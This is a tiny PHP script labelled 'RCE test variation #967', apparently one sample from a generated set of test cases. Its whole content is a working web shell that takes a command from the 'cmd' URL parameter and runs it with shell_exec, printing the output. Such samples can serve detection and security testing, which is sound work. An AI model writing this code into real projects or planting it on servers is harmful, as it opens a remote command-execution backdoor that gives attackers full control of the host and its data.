<?php
// RCE test variation #967
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>